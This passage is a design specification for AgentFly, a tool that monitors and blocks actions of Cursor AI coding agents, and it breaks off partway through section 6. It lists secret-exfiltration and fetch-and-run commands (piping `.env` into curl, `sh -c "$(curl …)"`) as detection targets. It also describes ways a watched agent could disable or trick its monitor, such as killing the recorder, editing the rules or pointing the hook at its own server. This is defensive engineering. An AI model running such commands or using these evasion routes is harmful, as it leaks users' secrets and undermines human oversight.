# AgentFly for AI coding agents: specification (v1)

Written in plain language on purpose. If a sentence needs a developer to
explain it, that sentence is a bug in this document. Words in *italics* are
explained in the glossary at the end (section 13).

---

## 0. Status

This is the **v1 target**. It describes what AgentFly will be when the v1 cards
are done, not what the code does today. The code moves toward this document
card by card. Where the two differ, this document wins for new work; the cards
say which part of the code changes when.

The hackathon version of this document is in git history:
`git show 3871787:docs/archive/SPEC-hackathon.md`. HOOKS.md and README.md still describe the
code as it is today.

Sections 7, 8 and 11 are technical reference for the people building it; the
rest is written for the owner.

Numbers like (D5) point to the owner's decisions, kept in the maintainers'
private process repo; `git show 3871787:docs/DECISIONS.md` has them up to D31.

---

## 1. The idea in one paragraph

An AI agent in Cursor can read your files, run commands and call tools, all by
itself. Without help you cannot easily see what it did, in what order, or stop
it from doing something dangerous.

**AgentFly** watches every action that Cursor reports about the agent, in every
project on your machine, and draws it live as a trail. It also has **rules**.
When the agent is about to do something dangerous, a rule stops it (or warns
you), and the message says *which rule* and why.

Like the black box on an aeroplane: it records, and it can also say "no".

Pitch sentence: **"See what your AI agent is doing, and stop the next step
before it does something you would regret."**

Honest limit, said once: it stops the *next* step. When the agent reads a
secret file, that text has already gone to the AI model. This tool cannot undo
that. It can stop the secret from being sent anywhere else.

---

## 2. Goals and hard constraints

Goals, in priority order:

1. **Install once, protected everywhere.** `brew install`, one setup command,
   start. Then any project opened in Cursor is watched and protected, with no
   cloning of AgentFly and no per-project setup. Upgrade and uninstall are
   clean, and uninstall removes the hooks.
2. **Rules you can change easily.** Rules live in a file, not in Python. Three
   outcomes: block, warn, highlight. You see every change and approve it
   before it takes effect.
3. **A UI you enjoy looking at.** It shows the live trail, why something was
   blocked or flagged, and past sessions, and stays readable in long sessions.
4. **Memory across sessions (experiment only).** The first question is whether
   it is feasible and useful, not building it. See section 12.

Hard constraints (non-negotiable):

- **The watched agent cannot edit, disable or weaken its own rules.** The
  wording the owner approved (D1): **prevented for config and rules; detected
  for tampering with installed code.** Section 10 says what that covers.
- **No secrets or file contents are stored.** Anything beyond what section 4
  lists needs the owner's explicit decision.
- **Blocking decisions are fast and local.** They use memory only and never wait
  for the network or a database.
- **Everything runs locally on your machine.** Anything that leaves it (the
  optional Neo4j copy, section 3) is off by default and your own choice.

Out of scope for v1: teams, central dashboards, cloud sync, SSO; agents other
than Cursor (the design leaves room for Claude Code later, D18); Linux and
Windows.

---

## 3. How it works

```
Cursor agent → hook client → recorder service → page on screen
   (acts)      (Cursor calls   (decides allow,    (live trail, past
               it before each   block or warn;     sessions, rules)
               action)          saves a copy)
```

**Hook client.** A hook is a small program Cursor runs *before* the agent does
something. Cursor hands it a description of the action; it answers "allow",
"deny" or "ask". AgentFly's hook client is one small file, `agentfly-hook`,
using only what ships with Python (D5, D18). It runs on a Python that AgentFly
installs for itself (a relocatable standalone build, owned by the system, not
your user), never on your own Python. It strips the action down to safe facts,
asks the recorder, and prints the answer. If the recorder does not answer, or
answers with a 401 or 403, or the input cannot be read, it applies the offline
guard (section 9). It always posts to `127.0.0.1:8787`: there is no port file
and no environment variable it reads (D25). A port kept in a file the agent can
write would let the agent point the client at its own server that always
answers "allow". If a configurable port is ever needed, it goes in the
system-owned config, not in `~/.config`. Details in section 8.

**System hooks file.** `agentfly init -g` writes the hook entries once into
Cursor's system-wide file, `/Library/Application Support/Cursor/hooks.json`,
owned by the system user (root). Every project you open in Cursor uses it, so
there is no per-project setup, and the agent cannot edit it without your
password (D2). The hook client and its Python live in
`/Library/Application Support/AgentFly/`, also system-owned. It lists only
events that the installed Cursor version is known to accept. A Cursor newer than
the newest version AgentFly has checked gets that newest version's events and a
warning (D32); any other unknown version, or an unknown event, makes `init -g`
write nothing and say so (D23, section 8). Nothing inside Cursor shows that an
unchecked version dropped an event, so `agentfly doctor` fails on a version that
is not on the list unless Cursor's Hooks log shows the hooks loaded (D32,
section 7).

**Recorder service.** A small program on your machine, `agentfly serve`, that
listens on `127.0.0.1:8787` only. It receives each action, checks the rules and
answers in a fraction of a second, using notes kept in memory. The macOS
service manager (launchd) keeps it running and restarts it if it stops: through
`brew services` for a Homebrew install, and through a LaunchAgent AgentFly
writes itself for `uv tool` and `pipx` installs (D8). Both set `KeepAlive`
(D4). Commands: `agentfly start`, `stop`, `status`.

**Rules.** The active rules are one file, owned by the system and readable by
everyone, so the agent cannot change it (D3). A small fixed set of rule *kinds*
is written in Python; the file only fills in their parameters and lists (D10).
Rule R0, which protects AgentFly itself, is in code and no file can switch it
off. Section 5.

**Local store.** After the recorder has answered, it saves a cleaned copy of
the step in the background into a SQLite database on your machine (D14). That
store feeds the History tab. Saving never delays the answer. **Neo4j is an
optional extra copy, off by default**; if you turn it on, the same cleaned
steps are also written there, using a login file only you can read. Neo4j
receives steps only when `~/.config/agentfly/config.toml` says `neo4j = true`;
a login file that is merely present does not turn it on (D14). Steps older than
28 days are deleted. `agentfly wipe` deletes the saved sessions and steps from
the local store now. It never clears the "secret was read" marks (section 5),
and the Neo4j copy is removed only by the store's own `--clear`.

**The page.** A web page served by the recorder at `http://localhost:8787`,
a read-only view. The live trail reads the recorder's memory (so it works
without any database); past sessions come from the local store. Section 6.

**Where files live (D7).** Config (token, `config.toml`, rule drafts, the
optional `neo4j.env`, mode 600): `~/.config/agentfly/`. Data (session notes, the store,
logs): `~/.local/share/agentfly/`. A chat's session note is written before the recorder
answers whenever it makes that chat stricter (a mark, a trigger, an inherited window, a link to a
parent or a subagent), so a crash or a kill forgets none of them. The rest of a note (the step
counter, when the chat was last active) is saved a few seconds later, off the answer, by one
writer; at start the step counter is raised to what the local store holds, so a restart never
numbers a step over a saved one. A note is dropped 29 days after the chat's last activity (D29,
section 5). System-owned parts (hooks file, hook client,
bundled Python, active rules): `/Library/Application Support/AgentFly/`. The
hackathon folder `~/.config/flightrecorder` is migrated once, by the recorder's
first start (so `agentfly serve` and `init -g` both find it moved).

---

## 4. What is stored and how commands are cleaned

Only *facts about actions*. Never the contents of files.

| Thing | What we store | Example |
|---|---|---|
| Session | id (Cursor's conversation id), start time, end time (when Cursor reports it), **workspace root path**, **marked yes/no** (whether the rules ever counted the chat as marked, section 5) | one Cursor chat |
| Step | order number, time, kind (read / shell / edit / tool), tool name (tool calls only), verdict, **marked-the-chat yes/no** (this step is the one that made the chat marked) | "Step 4, shell, blocked" |
| File | path (relative to the workspace), sensitive yes/no | `.env`, sensitive |
| Command | cleaned command (see below) | `curl -d <arg> ntfy.sh` |
| Host | website name only | `ntfy.sh` |
| Rule | id, short description | R1 |

Compared with the hackathon version, v1 adds the workspace root path (the one
item D14 asked the owner to approve), a session end time, and the *highlighted*
verdict below. The workspace path lets History tell projects apart once AgentFly
watches every project. It is stored in the local store only, not in the optional
Neo4j copy (D14).

The two marked yes/no items (owner, 2026-10-19) are stored in the local store
only. They record what the rules decided, so History does not have to guess from
the saved steps: a chat counts as marked when the rules treat it so, including
through a subagent link or the 30-minute workspace fallback (section 5), and it
stays marked in History after that window ends. At most one step is the marking
step: the one on whose event the chat became marked. A chat marked only through
a link or the workspace fallback has none; if it later marks itself (for example
after the fallback window has ended), that step is its marking step.
`GET /api/sessions/{id}/steps` names it by its order
number (`marked_order`), the way `GET /api/steps` does. Chats saved by an older
recorder keep the marked value History showed for them, and have no marking step.

Verdict can be: allowed, blocked, warned or highlighted (allowed, with a mark
in the page). The *Why* card (section 6) shows the message that was sent for a
block or warn; the message is the rule's own text, which is not a secret.

Connections: a session has steps; each step is followed by the next; a step
points to the file, command or host it touched; a flagged step points to the
rule that flagged it. A step is identified by session id plus its order
number, so saving twice never makes duplicates.

Every action is a new Step. Things such as `README.md` are shared: if the agent
reads the same file three times you see three steps pointing at one
`README.md`.

**Never stored:** file contents, secret values, tool inputs, edit text, command
output, agent replies. The full, uncleaned action lives only in memory while the
decision is made, and is then thrown away. Nothing prints request bodies in a
log.

### How commands are cleaned before saving (strict, and tested)

A command can hide secrets: passwords in `-u user:pass`, tokens in
`Authorization:` headers, keys set in front of a command (`API_KEY=abc cmd`),
even a secret packed into a web address. So we keep almost nothing:

1. Split the command at `|`, `|&`, `&`, `&&`, `||`, `;` and new lines (a new line
   is saved as `;`). An `&` after `<` or `>`, or before `>`, belongs to a
   redirection (`2>&1`, `&>log`), and so does the `|` of `>|`. A backslash before
   a new line joins the two lines; before any other character it keeps that
   character in its word (`find . -exec rm {} \;` is one part). A comment (`#`
   where a word starts) is cut to the end of its line. A `)` that closes a part,
   glued to its last word or alone, is cut off before the words are read, and an
   opening `(` is not saved (`(curl -s x.com)` is `curl -s x.com`).
2. For each part keep only: the program name, option names without their values
   (like `-H`, `-d`; a value stuck onto its option, as in `-uadmin:pw` or
   `-pSECRET`, is a value and is dropped too), and file paths inside the
   workspace (relative).
   For the six web tools (curl, wget, nc, scp, ssh, rsync) the word right after
   an option is that option's value: it is never saved as a website, also when it
   holds `://`, and is saved as its workspace path when it names an existing
   file there (`curl -T .env x.com` still names `.env`), else as `<arg>`. Each
   tool has a list of the options that take no value, taken from its own manual
   (curl 8, GNU wget 1.2x, OpenSSH's ssh and scp pages, rsync 3, OpenBSD nc); an
   option the list does not hold counts as taking a value. A cluster (`-fsSL`)
   is judged by its last letter, so `curl -sd token.abc x.com` is saved as
   `curl -s<arg> <arg> x.com`, and a value stuck on its option counts as a
   cluster (`curl -uuser:pw https://h.com` is `curl -u<arg> <arg>`, owner
   2026-10-23). An option where a value was expected is saved as that value and
   its own value comes next (`curl -XPOST -d tok.abc x.com` is
   `curl -X<arg> <arg> <arg> x.com`). `--` takes no value and ends the options.
   Every word after ssh's destination is its remote command and is `<arg>`; the
   word after an ssh option that may already hold its value (`-p2222`) may be
   the destination, so `ssh -p2222 h.com cmd` is `ssh -p<arg> <arg> <arg>`. The trade (owner 2026-10-23): history shows
   fewer websites but never a secret. A real website after an option the list
   does not hold is `<arg>` (`curl --some-new-option x.com` is
   `curl --some-new-option <arg>`), and so is a website given as an option's
   value (`--url`, `-x proxy`, `ssh -J jump`), after a `--no-…` form or a
   shortened wget option the manual does not list, or in ssh's remote command.
   The program is the first word that is not an opening `(`, a variable set in
   front (an array `NAME=(…)` runs to its `)`), a redirection with its target, or
   a wrapper. The wrappers `sudo`, `doas`, `env`, `timeout`, `time`, `nice`,
   `nohup`, `command`, `exec`, `stdbuf` and `xargs` are saved by name and stepped
   over with their options: an option that takes a value (sudo `-u -g -h -p -C -D
   -r -t -U`, doas and env `-u -C`, timeout `-s -k`, nice `-n`, stdbuf `-i -o -e`,
   xargs `-n -L -P -s -d -E -I -a`) keeps its name and its value is `<arg>`, `env`
   and `sudo` take `NAME=value` as `NAME=<removed>`, and `timeout` then takes its
   duration (`sudo -u bob curl -s x.com` is `sudo -u <arg> curl -s x.com`). Any
   other wrapper option (`sudo -E`, `sudo -s`, `env -S`), a 9th wrapper word or a
   17th `(` in one part leaves the rest of the part `<arg>`. A shell's words from
   its `-c` on (`bash -c`, `sh -lc`) and every word after `eval` are `<arg>`. A
   redirection (`>f`, `2>&1`, `<f`, or a bare `>` and its target) uses up no
   option value; its target is saved as any word. A word the shell may turn into
   no word or several makes the word after it a value (`<arg>`): an unquoted `$`
   (`$X`, `${X}`, `a$X`), `"$@"` or `"${X[@]}"`, a glob character (`*`, `?`, `[`),
   a brace list (`{a,b}`, `{a..b}`), a process substitution (`<(cmd)`, which is
   no redirection) or a `<` or `>` inside the word; after ssh's
   options it may hold the destination, so it and the rest are ssh's command. A
   double-quoted `"$X"` is one word and is read as one. For any other program a
   word holding `://` right after an option (not `--`) or after such a word is
   that option's value, `<arg>` (`tool --url https://a.b.com` is
   `tool --url <arg>`); one after no option keeps its website name.
3. Replace everything else with `<arg>`. A variable set in front of a command
   is saved as `NAME=<removed>`.
4. If the command cannot be split cleanly (an unbalanced quote, `$(...)`,
   backticks, an inline text block such as `<<EOF`, a carriage return, or an
   unquoted `${` whose `}` is not in the same word, as in `${X:-a b}`), keep only
   the program name and the word `<unparsed>`. Ordinary balanced quotes are fine and are
   handled by the steps above.
5. For a web address, keep only the website name. Drop the user, password, path
   and query. If a piece of the website name is very long or looks encoded,
   keep only the last two parts (like `evil.com`).
6. For tool calls keep only the tool name, never its inputs. For edits keep the
   path only, never the text.

Cleaning is on by default. The cleaner is as strict as above even where the
rule check (section 5) treats a command more kindly, for example a quoted
heredoc. Test case: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1`
is saved as `curl -H <arg> x.com`.

**Important, from the Cursor docs:** the `beforeReadFile` input contains the
file's **contents**. The hook client throws the contents away before anything is
sent to the recorder or written to a log (section 8).

---

## 5. Rules

A rule has an id, a severity, a message and a small check: a named function that
looks at the action and the session and answers yes or no. There is no
expression language. Adding a rule means adding an entry to the rules file; a
new *kind* of rule is Python.

### Severities (D11)

| Severity | What Cursor does | What you see |
|---|---|---|
| **block** | The action is denied. The rule text is in both messages, the one for you and the one for the agent. Cursor cannot override it. | Red in the page, with the *Why* card |
| **warn** | On a shell command, Cursor pauses and asks you (Skip, Always Run, Run). On every other event the action is allowed and marked. | Purple in the page |
| **highlight** | The action is allowed. | A mark in the page only |

Two facts behind the table: an allow with a message shows nothing in Cursor
(so warn and highlight on non-shell events are visible in AgentFly's page
only), and "Always Run" lets you turn a warned command into a standing
allowance inside Cursor. Block is not affected by it. The `ask` answer was seen
in one Cursor mode ("Auto-review with Sandbox"); repeat that check in the mode
you actually use.

### Rule file (D10)

Rules are written in TOML, read with Python's built-in `tomllib`. A small fixed
set of kinds, for example:

- `match`: an event plus a class of file, command or host;
- `after_then`: once X has happened in this session, Y gets this severity.
  "Block `npm publish` after reading `.env`" is one `after_then`.

Each kind is one named pure check; the file fills in parameters and named lists
(sensitive file names, outbound tools, local hosts). Each rule carries inline
tests. A `count` kind can come later.

Spike S3 tried ten of the owner's real rules on these two kinds. Seven fit as
they were. The other three needed small additions, and the owner approved those
instead of a third kind. Each is one named pure check in Python:

- `command` patterns also match flag variants: a trailing `*` (`--data*`),
  `=` forms, and clustered short flags (`-sd`, `-d@f`), through the normaliser;
- `path_scope = "outside_workspace"` on `match` and on the trigger tables,
  worked out from the workspace folders Cursor reports and the resolved path
  (symlinks and `..` are the engine's job);
- `pipe_into = <list>` on `match`: true when a command in the line feeds a
  program in the list (covers `| sh`, `sh -c "$(curl …)"`, `bash <(curl …)`).

"After reading `.env`" means the whole `.env` family, as in the sensitive-file
list below. The three additions are not built yet (card V5c); the rest of this
section's file format is what V5b built.

**The file format (V5b).** `schema = 1`, one `[lists]` table of named arrays of
strings, and `[[rule]]` tables, each with its own `[[rule.test]]` tables.

| Field | Where | Meaning |
|---|---|---|
| `id`, `kind`, `severity`, `message` | every rule | `kind` is `match` or `after_then`; `severity` is `block`, `warn` or `highlight`; `id` is unique and never `R0` |
| `event` | `match`, and inside `after` / `then` | a list of `read` (`beforeReadFile`, and a text search that returns lines: `preToolUse` of the Grep tool, below), `shell` (`beforeShellExecution`) and `write` (`preToolUse` of the Write tool) |
| `path`, `path_except` | same | the name of a list of path patterns. A pattern without `/` matches the file *name* (`.env`, `*.pem`); with `/` the whole path (`**` crosses folders, `~/` is the home folder). In a shell command a path condition looks at every word, and at the text after the last `=` or `@` of a word |
| `command` | same, `event = ["shell"]` | the name of a list of command patterns: a program, then extra words (`"git push --force"`). It matches when the program is a word of the normalised command (so `sudo`, `env`, `bash -c` and `$(…)` do not hide it) and every extra word is among the later words, in any order |
| `command_class` | same, `event = ["shell"]` | a class built into the program: `outbound` (R1's definition, below) |
| `host_not_in` | same, `event = ["shell"]`, beside a `command` or `command_class` | the name of a list of host names; true when the command names a host not in it |
| `after`, `then` | `after_then` | tables of the fields above; the follow-up fires only after the `after` table matched once in this chat |
| `steps`, `expect` | `[[rule.test]]` | steps are `"read: PATH"`, `"shell: COMMAND"`, `"write: PATH"`; `expect` is what the last step gets: `block`, `warn`, `highlight` or `allow` |

When several rules fire, the strictest wins (block, then warn, then highlight); a
tie goes to the rule that comes first in the file. R0 is always first and only in
code. A trigger is kept per chat like R1's mark (it survives a restart and
reaches subagents and parents, D21) and counts before the check on the same
command.

**Which file is in force.** The recorder reads `/Library/Application Support/AgentFly/rules.toml`
once, at start. `init -g` writes it when it is missing, replaces it when it is byte for byte a
default the package once carried (nobody edited it; the package keeps the hash of every default
it has shipped, D28; a recorder restart applies the new one), and keeps an edited file with a
one-line notice; it never writes, chowns or chmods an edit. A root file the recorder's user cannot
read (mode 0600) gets one line instead: the recorder cannot read it, the default rules are in
force, and the fix (`sudo chmod 644` the file, then restart the recorder). The unprivileged run
cannot read the bytes either, so it says this by owner and mode alone, over a default too, and
asks for no password when nothing else is to be done; with other work (an upgrade) `init -g`
stops on that line before the password and before it changes anything, edit or default. `uninstall`
removes the file with the folder, but first copies an edited one (any file that is not an unedited
shipped default) to `/Library/Application Support/Cursor/agentfly-backups/rules.toml.<stamp>`,
beside the `hooks.json` backups (D30). What `init -g` writes is the packaged default as read once,
compared with the hash in the wheel's `RECORD` and parsed under the checks below. Without the file
(a developer `serve`) the recorder runs the default file inside the package.

The recorder believes the file only if it is a plain file, not a link, owned by root, that group
and others cannot write (D3): the agent's user can write none of these. A file that cannot be
used is not loaded: the default runs, and `/health` (`rules_problem`), `GET /api/rules`,
`agentfly doctor`, `agentfly start` and `agentfly status` say why. That covers a file that is not
trusted, a syntax error, an unknown field, an entry for R0, an R1 below the minimum, and more
matching work than the limit.

**The least R1 may say (D27).** R0 is in code; R1 is in the file, so the program holds R1's
minimum too, and a file whose R1 is missing or weaker is refused like an entry for R0. R1 must be
an `after_then` rule with severity `block`. Its `after` fires on `read` and on `shell`, with a
name list that marks at least every file *name* the "R1: secret, then network" bullets below count
as secret, and exceptions no wider than theirs: the two SPEC makes, a name that starts `.env` and
ends `.example`, `.sample` or `.template`, and one that starts `id_rsa` and ends `.pub`, never a
folder (so an exception cannot match `credentials-prod.example`, which is a secret). Its `then` is exactly `event = ["shell"]` with
`command_class = "outbound"`, and nothing else. The names are judged by the shape of the
patterns, not on sample names: for each of those bullets the list holds one pattern without `/`,
`?` or `[` that is the bullet's one name (`.env`) or has a single `*` between a part the bullet's
fixed start begins with and a part its fixed end ends with, the two together no longer than `.env`
for that bullet (so `.env*` in place of `.env` and `.env.*`, `.*`, `*env`, `*pem` and
`cred*` are fine, while `.env.?*`, `?*.pem`, `.env*.env` and a union such as `.env.[!s]*` plus
`.env.s` are refused). R1 holds no floating folder pattern (`.ssh/**`; an anchored `~/.ssh/**` is
fine), because R1 is never cut short by the rules limit. Both are measured against the program's
own minimum and not against `default.toml`, so a wider later default never refuses an older file. Widening the
lists and rewording the message are allowed. A local exception (a company host) waits for the
reviewed change path (V7).

**What a file may cost.** Every path pattern of every clause is tried on every word of a shell
command, inside the hook client's 0.5 s wait, so two limits keep a hook short. When the file is
read, it may ask for at most 200 units of matching work in all: a clause with path patterns 2, a
pattern without `/` 1, a pattern with `/` 4 plus 12 for each `**` (an unanchored pattern has one
more) plus 1 for each folder or name past the fourth, R1's `after` twice because it runs twice. The
packaged default uses 31. When a hook runs, the work that grows with the command, floating folder
patterns (one that may start at any folder, such as `secrets/**`) and command-list entries, shares
one budget for the hook: the *rules limit* (about 20 ms of matching). A rule the budget cannot
finish is unfinished: an unfinished `block` rule denies the action with the rules-limit message and
records no trigger, an unfinished `warn` asks on a shell command, and an unfinished `highlight` is
skipped; `/health` (`rules_limit`) and the recorder's log say so. R0 and R1 are never cut short: R1
may hold no floating folder pattern, and no rule's `path_except` may hold one. Measured on a Mac,
a 300-word command with paths 60 folders deep takes 22-116 ms through the whole hook under any file
`rules check` accepts. A much longer command (hundreds of words of about 1,000 characters each) can
still pass the client's wait and fall to the offline guard (a known gap).

`agentfly rules check [FILE]` prints every problem of a file, each naming its rule, and exits 1 if
there is one; `agentfly rules test [FILE]` runs every inline test (the rule that wins must be the
rule the test belongs to) and exits 1 if there is none to run. With no FILE both read the file the
recorder would load, and read it the way the recorder does, owner and mode included; a FILE is a
draft and only needs to be well formed, unless it is the active file itself.

### R0: protect AgentFly itself (in code only)

Blocked always, even before any secret is read, and no rules file can remove or
weaken it:

- touching AgentFly's config, data and system folders, any `hooks.json` (user,
  system or project), the rules file or the token, or the recorder's service file
  in `~/Library/LaunchAgents` (named by its launchd label, with or without
  `.plist`: `dev.agentfly.recorder`, and Homebrew's `sh.brew.agentfly` and older
  `homebrew.mxcl.agentfly`);
- commands that stop, unload or remove the recorder (`kill`, `pkill`,
  `launchctl`, `agentfly stop` and `agentfly uninstall`, `brew services`) or
  that name its port;
- `agentfly serve` (a second recorder once rotated the token) and
  `agentfly wipe` (deleting the history is for you, not the agent);
- touching the package that `agentfly init -g` and `agentfly uninstall` run as
  root: AgentFly's tool environment (`uv tool`, `pipx` and Homebrew keg, in
  their default places) and its two entry scripts, `~/.local/bin/agentfly` and
  `agentfly-hook`. Running one by its full path counts as touching it; plain
  `agentfly status` does not;
- installing, upgrading, reinstalling or removing AgentFly with `uv tool`,
  `pipx` or `brew`. A command is denied when it names AgentFly, an operand is a
  file, a URL, a pattern or a variable, the operands come from `xargs` or
  `find -exec`, or it acts on every tool at once (`brew upgrade`,
  `uv tool upgrade --all`, `pipx upgrade-all`); installing other tools by name,
  and `uv tool list`, stay allowed. Text that cannot be parsed is denied when it
  holds one of these verbs;
- a Write or edit whose target path is one of those guard paths.

R0 sees commands after the normalisation below, case-folded, and also checks
the raw text, so a command that cannot be parsed cannot hide a guard name.
The exact guard list is fixed when the R0 card is built.

### R1: secret, then network

**What counts as a sensitive file** (decided by the file's *name only*):
- any file named `.env` or starting with `.env.` (for example `.env.local`),
  **except** ones ending in `.example`, `.sample` or `.template`;
- any file ending in `.pem` or `.key`;
- any file whose name starts with `id_rsa` (but not `.pub`) or `credentials`.

These lists are in the default rules file (G2) as `secret_names` and
`secret_names_ok`; R1 is its first rule.

**Marking a session** ("has seen a secret"):
- when the file-read tool opens a sensitive file; or
- when *any word* in a shell command names a sensitive file (so `cat .env`,
  `grep KEY .env`, `source .env`, `cp .env /tmp` all count); or
- when a text search (Cursor's Grep tool) that returns lines is aimed at one: the
  file its `file_path` names, or a name its `glob` can match. Marking too often
  is harmless.

**A search is a `read` (R1G).** Only a search that returns lines reads file text:
`output_mode` "content", missing, or a value AgentFly does not know (also one that
is not a string). "files_with_matches" and "count" return names only and are no
event, so they never mark and no rule sees them. A search that returns lines is a
`read` for every rule whose `event` lists `read` (no new event name, so the least
R1 may say, below, covers it, and no file can leave it out). It reads the file
`file_path` names, and every name its `glob` can match; a search of a folder with
no glob reads nothing by name (section 10). The glob is read as ripgrep reads one
(`{a,b}`, nested ones too, `[!…]` and `[^…]`, `**`, `\` escapes outside a class, a
member inside one, a leading `!` that
excludes, trailing whitespace dropped as in a gitignore line: every Unicode
whitespace character, a line break, `\r`, a vertical tab, a form feed and a no-break
space too, unless the glob ends in `\` and a space, which keeps all of it),
case-folded like a rule path (a class allows a letter when it allows it in either
case, so `.e[!A-Z]v` still reads `.env`, and a class that is not plain, with a
member that is a control character or past the printable ASCII characters, a `\`
or a chained range such as
`[a-c-e]`, is any one character: when unsure, it matches), and each brace
alternative is judged on
its own by its file name, its folders taken as able to sit anywhere under
`file_path` (anywhere at all with none). An alternative matches a condition's
`path` when either:
- it matches a sample name made from a `path` pattern (each `*` filled with
  nothing or with one fixed letter, a `?` or class with one character it allows:
  `.env`, `.env.x`, `x.pem`, `id_rsa`, `credentials`, …) that `path_except` does
  not match, so `*`, `**/*`, `.env*`, `?env` and `.e[n]v` read `.env`; or
- its own name, its `*` read as that letter and each `?` or class tried with each
  character the names of the condition's `path` patterns hold (every ASCII character
  when one of them has a class), is matched by `path` and
  not by `path_except`, so `.env.prod*`, `credentials.*`, `.en?.local` and
  `credential?.py` read a secret name. Whether some such name is matched by `path`
  is worked out position by position, not name by name, so a glob with many `?`
  (`test_???.py`) is judged, not guessed (lead 2026-10-23); the names are listed
  one by one only to hold them against `path_except`, and when there are too many
  of them `path_except` is not used (toward marking).

A `path` pattern whose name has a character past ASCII (ripgrep's `?` matches one
byte of it, so `secr??t` reads `secrét`), or a class that allows no ASCII
character, has no sample to judge by: every glob reads it (toward marking).

A glob with a leading `!` reads every file it does not name, so it counts as
reading a secret unless it leaves out every name (`!*`). So `*.py`, `*.json`,
`test_*.py` and `.env.example` read no secret, and `!*.py` reads one. A `path`
pattern with `/` also needs its folders to fit under `file_path`; a `path_except`
with `/` is not used for a search. The test has its own fixed bound, a count: a
glob longer than 512 characters, with more than 64 brace alternatives, more than
32 classes or braces nested more than 32 deep, or whose test would take more than
10,000 steps, a glob ripgrep would refuse, and a `glob`
that is not a string all count as reading a secret. A `file_path` that is not a
string counts as none. The search text itself is never sent to the recorder, and
the stored step keeps neither it nor the glob.

**Scope of the mark.** It belongs to one chat (Cursor's conversation id). A
secret read in one chat does not affect another, except for the chat's own
subagents (below). It is saved to a small file before the recorder answers, so
that a restart or a crash of the recorder does not forget it, and it clears only
when a new chat starts. The note of a chat that has had no activity for 29 days
is dropped (one day past the history's 28, D29; checked at start and every hour),
unless the chat is marked or holds a trigger (its own, or through its parent chats, as
a subagent does), holds an inherited mark or trigger that is still open, or is the parent
of a chat that stays; the Task links that tie them stay too. While the recorder runs it
remembers where a dropped chat's step numbers stopped, so a chat that comes back never
numbers a step over one it already has.

**Subagents (D21, D9).** When the agent starts a helper (a subagent), Cursor
gives it its own chat id. Spike S5 found that every event inside a subagent
still carries `parent_tool_call_id`, which equals the id of the parent chat's
`Task` call. So the mark follows that id in both directions: a subagent of a
marked chat is marked, and a mark set inside a subagent also marks its parent.
Without that, a send handed to a subagent could slip past the mark. The
`subagentStart` event is registered too, record-only, as a second source of the
same link. Nothing depends on `subagentStop`: a background subagent never fires
it. As a fallback for a Cursor version that drops the field: if a chat that holds
a mark or a trigger starts a `Task` and no event with that id ever arrives, a new
chat in the same workspace inherits, for 30 minutes counted from the `Task`, what that
chat holds at the moment the new chat appears (so a mark it gets after starting the
`Task` still reaches the new chat; a chat that appeared earlier is not changed by it).

**Command normalisation.** Before any rule looks at a shell command, it is
normalised: `bash -c`, `sh -c`, `env` and `sudo` are unwrapped, `$(…)` and
backticks are looked into, and paths are case-folded. This applies to every
rule, R1 included (D10). It is new work: today's command cleaner unwraps nothing.

**Blocking.** Once a session is marked, any command that sends data to another
computer is blocked. After normalisation that covers:
- `curl`, `wget`, `nc`, `scp`, `ssh`, `rsync`, `git push`, `gh`, `aws`;
- an inline-code one-liner (`python -c`, `node -e`, `perl -e` and `ruby -e`),
  **whether or not it mentions "http"**: also under a versioned name (`python3.12`,
  `perl5.34`, which macOS ships), with clustered letters (`perl -lane`,
  `ruby -ne`), perl's `-E`, and after options that take a value (perl's `-M…` and
  `-m…`, `-I`; ruby's `-r`, `-I`, `-C`, `-X`, `-E`, an encoding, and its long
  `--enable`, `--disable`, `--dump`, `--backtrace-limit`, `--parser`,
  `--crash-report` and the `--…encoding` options; ruby's `-0`, `-T` and `-W`
  take only digits and `-K` one character, so `ruby -We` is code; perl's long
  options, `--version` and `--help`, hold no code). A script file
  (`perl x.pl`, `ruby x.rb`), `perl -c x.pl`, `perl -v` and `ruby --version` are
  not one-liners;
- a command that cannot be parsed (an unbalanced quote, or a `<<EOF` block);
- the same tools inside a wrapper.

One exception keeps normal work possible: the body of a *quoted-delimiter*
heredoc (`<<'EOF'`) is treated as plain text, so
`git commit -m "$(cat <<'EOF' … EOF)"` and `tee f <<'EOF'` are parsed and not
blocked. The exception does not apply when the program that reads the heredoc
is a shell or an interpreter: `sh`, `bash`, `zsh`, `python`, `python3` (also
versioned names such as `python3.12`), `node`, `ruby` and `perl`, also when
wrapped in `env`, `sudo` or `xargs`. There the body is code that runs, so
`bash <<'EOF' … EOF` and `python3 - <<'EOF' … EOF` count as outbound after a
secret read. Every other unparseable command counts as outbound too. The cost,
accepted by the owner: a commit message written with an unquoted `<<EOF` is
blocked in a marked session, so the agent must commit another way (for example
`git commit -F file`) or you start a new chat.

**Order matters:** if one command both reads a secret and sends it
(`cat .env | curl -d @- host`), the marking happens first and the block
applies to the same command.

**Not blocked:** sending to your own computer (`localhost`, `127.0.0.1`, and
addresses inside your own network). Otherwise `curl localhost:8000/health`
would be blocked. This is a known hole: a tunnel could bypass it.

### The mark is not the only rule

R1 and R0 are the two rules v1 must have. Further rules (for example a warn on
`rm -rf` or `git push --force`, or on writes outside the workspace) are
ordinary entries in the rules file once the kinds are fixed.

### How a rule changes (D3, D12)

Nothing on the web port can change a rule (section 11). The flow is entirely in
the command line:

1. **Draft.** `agentfly rules draft` writes a draft file in your user folder.
   A draft the agent writes does nothing until you approve it.
2. **Check.** `agentfly rules check`: the schema, unknown fields, over-broad
   globs.
3. **Diff.** What changes, with *loosening* changes in red: a removed rule, a
   lower severity, a shorter list, a new exception.
4. **Backtest.** "Would have changed N decisions in M sessions" over your
   stored sessions.
5. **Approve.** `sudo agentfly rules apply <draft>` asks for your password,
   installs the rules into the system-owned file, and the recorder reloads. Your
   password is the secret the agent does not have.

No shadow period and no signed rule sets: the system-owned file does the
signing's job. To trial a rule safely, add it as `highlight` first.

### Drafting in plain language (D13)

Not in v1. `agentfly rules draft` fills in a rule kind, its lists and a
severity from command-line flags, and writes a draft file. There is no form in
the page. Spike S3 showed that a model can draft the rules that fit the kinds
accurately, but also that it can silently write a wrong rule that looks right,
so every draft is reviewed with its inline tests and the backtest. Once the
rules card is done, S3's ten sentences are tried again on the candidate models
before plain language is added; any cloud model needs the owner's approval
again. A model would only draft; it is never in the decision path, and it would
see your sentence and the rule schema, never session data.

---

## 6. The screen

The page is a read-only view (D15, confirmed by spike S4). It is **decision
first**:

- **Live Trail** is the home view. Every step has a badge (allowed, blocked,
